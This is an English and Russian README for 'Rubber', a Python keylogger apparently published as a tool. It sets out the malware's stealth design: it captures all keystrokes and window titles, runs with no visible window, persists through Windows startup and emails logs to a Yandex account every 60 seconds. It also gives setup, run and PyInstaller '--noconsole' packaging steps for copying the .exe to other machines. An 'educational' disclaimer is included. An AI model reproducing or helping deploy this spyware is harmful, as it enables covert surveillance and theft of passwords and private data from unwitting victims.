########################################
#          Rubber Keylogger            #
########################################

Rubber is a Python-based keylogger designed for educational and ethical purposes. It works stealthily in the background, capturing all keystrokes, logging the active window title, and sending them to a configured Yandex email at regular intervals.

========================================
Features:
========================================
- Captures all keystrokes.
- Logs the title of the currently active window.
- Sends logs to a Yandex email every 60 seconds.
- Operates invisibly in the background with no popups or console windows.
- Automatically adds itself to Windows startup for persistence.

========================================
How to Configure:
========================================
1. Open the `rubber.py` file in any text editor.
2. Replace the following lines with your Yandex email credentials:
   ```python
   EMAIL_ADDRESS = "your_email@yandex.ru"  # Replace with your Yandex email
   EMAIL_PASSWORD = "your_password"        # Replace with your Yandex app-specific password
Important: Use an app-specific password instead of your primary email password. Follow these steps to generate it:
Log in to your Yandex account.
Go to Yandex Account Security.
Enable App Passwords and create a new password for "Rubber".
Copy the generated password and paste it into the EMAIL_PASSWORD field in rubber.py.
========================================
 How to Run:
========================================
Place the rubber.py file in any directory of your choice.
Open a terminal or command prompt in the same directory.
Run the script:
python rubber.py
The keylogger will:
Capture all keystrokes silently.
Log the name of the active window for each keystroke.
Send logs to the configured Yandex email address every 60 seconds.
========================================
 Packaging into an Executable File:
========================================
To run the keylogger on systems without Python installed:
Install PyInstaller:
pip install pyinstaller
Package the script into an .exe file:
pyinstaller --onefile --noconsole rubber.py
The generated .exe file will be located in the dist folder. You can copy this file to any Windows machine.
========================================
 Legal Disclaimer:
========================================
Rubber Keylogger is strictly for educational purposes and ethical use. Unauthorized use of this tool to monitor or spy on others without their explicit consent is illegal and punishable by law. Always obtain proper permission before deploying this tool.

```plaintext
########################################
#           Rubber Keylogger           #
########################################

Rubber — это кейлоггер на Python, предназначенный для образовательных и этичных целей. Он работает скрытно в фоновом режиме, фиксирует все нажатия клавиш, записывает название активного окна и отправляет их на настроенный email Яндекса с регулярным интервалом.

========================================
Функции:
========================================
- Фиксирует все нажатия клавиш.
- Записывает название активного окна.
- Отправляет логи на email Яндекса каждые 60 секунд.
- Работает незаметно, без консоли или всплывающих окон.
- Автоматически добавляет себя в автозагрузку Windows.

========================================
Как настроить:
========================================
1. Откройте файл `rubber.py` в любом текстовом редакторе.
2. Замените следующие строки на ваши учетные данные Яндекса:
   ```python
   EMAIL_ADDRESS = "your_email@yandex.ru"  # Замените на ваш email Яндекса
   EMAIL_PASSWORD = "your_password"        # Замените на пароль приложения
Важно: Используйте пароль приложения, а не основной пароль от вашего аккаунта. Для его создания выполните следующие шаги:
Войдите в свой аккаунт Яндекса.
Перейдите в Настройки безопасности.
Включите Пароли приложений и создайте новый пароль для "Rubber".
Скопируйте сгенерированный пароль и вставьте его в поле EMAIL_PASSWORD в файле rubber.py.
========================================
Как запустить:
========================================
Поместите файл rubber.py в любую удобную папку.
Откройте терминал или командную строку в этой же папке.
Запустите скрипт:
python rubber.py
Кейлоггер будет:
Незаметно фиксировать все нажатия клавиш.
Записывать название активного окна для каждой клавиши.
Отправлять логи на указанный email Яндекса каждые 60 секунд.
========================================
Упаковка в исполняемый файл:
========================================
Если вы хотите запускать кейлоггер на системе без установленного Python:

Установите PyInstaller:
Копировать код
pip install pyinstaller
Создайте исполняемый файл:
pyinstaller --onefile --noconsole rubber.py
Готовый .exe файл будет находиться в папке dist. Вы можете скопировать его на любой компьютер с Windows.
========================================
 Юридическое предупреждение:
========================================

Rubber Keylogger предназначен исключительно для образовательных целей и этичного использования. Несанкционированное использование этого инструмента для слежки за другими людьми без их явного согласия является незаконным и может привести к уголовной ответственности. Всегда получайте разрешение перед использованием.
